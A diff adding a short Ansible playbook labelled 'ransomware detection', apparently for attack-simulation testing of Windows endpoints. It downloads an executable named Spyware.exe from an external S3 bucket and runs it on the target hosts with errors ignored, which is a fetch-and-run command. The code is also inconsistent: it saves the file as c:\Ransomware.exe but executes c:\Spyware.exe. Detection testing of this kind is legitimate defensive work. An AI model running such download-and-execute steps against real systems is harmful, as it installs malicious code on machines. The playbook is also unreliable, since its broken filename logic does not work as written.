@@ -1,0 +1,15 @@
+---
+# ransomware detection
+- hosts: "{{target}}"
+  gather_facts: no
+  tasks:
+  - name: Download Spyware
+    win_get_url:
+       url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/Spyware.exe
+       dest: c:\Ransomware.exe
+       
+  - name: Execute Spyware
+    win_command: c:\Spyware.exe
+    ignore_errors: yes
+    args:
+      stdin: Write-Host test
